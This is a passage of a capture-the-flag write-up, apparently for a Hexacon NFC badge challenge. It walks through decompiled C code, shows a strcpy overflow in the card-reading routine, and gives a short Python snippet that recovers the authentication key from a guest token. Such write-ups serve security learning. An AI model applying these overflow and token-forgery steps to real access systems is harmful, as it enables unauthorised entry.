<span id="lst-main-58">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">FILE</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-59">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">size_t</span> count<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-60">    </span>
<span id="lst-main-61">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">((</span>fd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> fopen<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data/admin_token.bin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> NULL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-62">        perror<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fopen"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-63">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-64">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-main-65"></span>
<span id="lst-main-66">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">((</span>count <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> fread<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!=</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-main-67">        perror<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fread"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-68">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-69">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span>
<span id="lst-main-70"></span>
<span id="lst-main-71">    fclose<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-main-72"></span>
<span id="lst-main-73">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-main-74"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
</figure>
</div>
</section>
<section id="bug-1" class="level1">
<h1>Bug 1</h1>
<p><code>read_card</code> (Listing&nbsp;4) moves data from the card’s sectors into the global <code>context</code>. This function contains the first potential vulnerability, as it uses <code>strcpy</code> to move the content from the third sector. This function will keep reading data from the card until a 0-byte is encountered.</p>
<div id="lst-read-card" class="C listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-read-card-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;4: <code>read_card</code> function
</figcaption>
<div aria-describedby="lst-read-card-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-read-card" style="background: #f1f3f5;"><pre class="sourceCode C code-with-copy"><code class="sourceCode c"><span id="lst-read-card-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">void</span> read_card<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>context_t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="lst-read-card-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-read-card-3">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> sectors<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>SECTORS_COUNT <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> BLOCKS_COUNT <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> BLOCK_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="lst-read-card-4"></span>
<span id="lst-read-card-5">    read_nfc_tag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>sectors<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-read-card-6"></span>
<span id="lst-read-card-7">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Read username</span></span>
<span id="lst-read-card-8">    strncpy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> read_sector<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>sectors<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">),</span> USERNAME_SIZE <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-read-card-9"></span>
<span id="lst-read-card-10">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Read token</span></span>
<span id="lst-read-card-11">    memcpy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> read_sector<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>sectors<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">),</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-read-card-12"></span>
<span id="lst-read-card-13">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Read data</span></span>
<span id="lst-read-card-14">    strcpy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> read_sector<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>sectors<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="lst-read-card-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
</figure>
</div>
<p>The <code>data</code> field in the <code>context</code> structure has space for the amount of data (0x30 bytes) of sector 3. <code>context</code> is stored in the globals together with the <code>admin_token</code>, <code>key</code> and <code>iterations</code> (see Listing&nbsp;3). So by overflowing the <code>data</code> field we can overwrite <code>key</code> and <code>iterations</code>. <code>iterations</code> determines the amount of hash iterations are performed in the <code>PKCS5_PKBDF2_HMAC</code> key derivation step in <code>derive_key</code> (see Listing&nbsp;5).</p>
<div id="lst-derive-key" class="C listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-derive-key-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;5: <code>derive_key</code> function
</figcaption>
<div aria-describedby="lst-derive-key-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-derive-key" style="background: #f1f3f5;"><pre class="sourceCode C code-with-copy"><code class="sourceCode c"><span id="lst-derive-key-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> derive_key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint32_t</span> iterations<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="lst-derive-key-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-derive-key-3">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> PKCS5_PBKDF2_HMAC<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span></span>
<span id="lst-derive-key-4">        admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// pass</span></span>
<span id="lst-derive-key-5">        TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// passlen</span></span>
<span id="lst-derive-key-6">        NULL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// salt</span></span>
<span id="lst-derive-key-7">        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// saltlen</span></span>
<span id="lst-derive-key-8">        iterations<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// iter</span></span>
<span id="lst-derive-key-9">        EVP_sha256<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(),</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// digest</span></span>
<span id="lst-derive-key-10">        KEY_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// keylen</span></span>
<span id="lst-derive-key-11">        key <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// out</span></span>
<span id="lst-derive-key-12">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-derive-key-13"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
</figure>
</div>
<p>If we can obtain the <code>admin_token</code>, we can create a card where the <code>username</code> is <code>hexacon_admin</code> and the <code>token</code> is <code>admin_token</code>. This should lead us to the authenticated admin screen.</p>
<p>In a normal run <code>iterations</code> is set to <code>1000</code> (see Listing&nbsp;3), which is not very high for a proper key derivation system. So it could be that <code>admin_token</code> is some brute-forcible string that could be found in a wordlist, as the <code>salt</code> input is set to <code>NULL</code>. With the overflow we could change the amount of iterations to <code>1</code>, so then just a single <code>SHA256</code> hash is calculated over the password. However it is more likely that the designer of the challenge just put a random <code>0x20</code> byte string in there. In this case even bruteforcing a single 256-bit hash is not feasible.</p>
<p>We considered setting <code>iterations</code> to <code>0</code>, so that perhaps no hash is calculated at all. This case is normaly caught by the <a href="https://www.openssl.org/docs/manmaster/man3/PKCS5_PBKDF2_HMAC.html">OpenSSL implementation</a> that was likely used, looking at the function signature. So this would not work either.</p>
<p>In the <code>compute_token</code> function (Listing&nbsp;6), the <code>key[]</code> array, resulting from <code>derive_key</code> function, is used to perform authentication by XORing it with the <code>SHA256</code> hash of the provided <code>username</code>, stored in sector 1 of the card.</p>
<div id="lst-compute-token" class="C listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-compute-token-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;6: <code>compute_token</code> and <code>check_token</code> functions
</figcaption>
<div aria-describedby="lst-compute-token-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-compute-token" style="background: #f1f3f5;"><pre class="sourceCode C code-with-copy"><code class="sourceCode c"><span id="lst-compute-token-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> compute_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>context_t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="lst-compute-token-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-3">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">char</span> to_sign<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>USERNAME_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="lst-compute-token-4"></span>
<span id="lst-compute-token-5">    memcpy<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>to_sign<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> USERNAME_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-compute-token-6"></span>
<span id="lst-compute-token-7">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>SHA256<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>to_sign<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> strlen<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">),</span> token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> NULL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-8">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-9">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-10"></span>
<span id="lst-compute-token-11">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> i <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> i <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> i<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">++)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-12">        token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>i<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">^=</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>i<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">];</span></span>
<span id="lst-compute-token-13">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-14"></span>
<span id="lst-compute-token-15">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-16"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-17"></span>
<span id="lst-compute-token-18">status_t check_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>context_t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="lst-compute-token-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-20">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(!</span>strcmp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>username<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ADMIN_USERNAME<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-21">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Admin authentication</span></span>
<span id="lst-compute-token-22">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>memcmp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> admin_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-23">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> INVALID_TOKEN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-24">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-25">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">else</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-26">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Regular guest authentication</span></span>
<span id="lst-compute-token-27">        </span>
<span id="lst-compute-token-28">        <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// Read card with token to check authenticity</span></span>
<span id="lst-compute-token-29">        read_card<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="lst-compute-token-30"></span>
<span id="lst-compute-token-31">        <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">uint8_t</span> expected_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{};</span></span>
<span id="lst-compute-token-32"></span>
<span id="lst-compute-token-33">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>compute_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> key<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> expected_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-34">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> UNEXPECTED_FAIL<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-35">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-36"></span>
<span id="lst-compute-token-37">        <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">#ifdef DEBUG</span></span>
<span id="lst-compute-token-38">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="lst-compute-token-39">        <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">#endif</span></span>
<span id="lst-compute-token-40"></span>
<span id="lst-compute-token-41">        <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>memcmp<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ctx<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-&gt;</span>token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> expected_token<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> TOKEN_SIZE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="lst-compute-token-42">            <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> INVALID_TOKEN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-43">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-44">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="lst-compute-token-45"></span>
<span id="lst-compute-token-46">    <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> VALID_TOKEN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="lst-compute-token-47"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
</div>
</figure>
</div>
<p>The unmodified card passes the token checks as guest, as shown on the screen, so we know that the token in sector 2 matches the username in sector 3. Therefore, we can calculate the value of <code>key</code> by simply XORing it with the hash of the <code>username</code> from sector 1 as shown below.</p>
<div id="lst-token-check" class="Python listing quarto-float">
<figure class="quarto-float quarto-float-lst figure">
<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-lst" id="lst-token-check-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
Listing&nbsp;7: Code to recover authentication key
</figcaption>
<div aria-describedby="lst-token-check-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
<div class="sourceCode" id="lst-token-check" style="background: #f1f3f5;"><pre class="sourceCode Python code-with-copy"><code class="sourceCode python"><span id="lst-token-check-1">token <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>.fromhex(</span>
<span id="lst-token-check-2">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'0B5F6A804DADD14B53145858F26B7DF0BA62DD2F89440E145C352BDB00C8090A'</span>)</span>
<span id="lst-token-check-3">key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>(a <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">^</span> b <span class="cf" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> a, b <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">in</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">zip</span>(token, sha256(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'hexacon_guest'</span>).digest()))</span>
<span id="lst-token-check-4"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">f'</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>key<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>()<span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>)</span>
<span id="lst-token-check-5"></span>
<span id="lst-token-check-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># '78eae65a206ad5631fc11748edeb2f84a01723b32c7b9adbe1a6311f207ea2bf' </span></span></code></pre></div>
</div>
</figure>
</div>
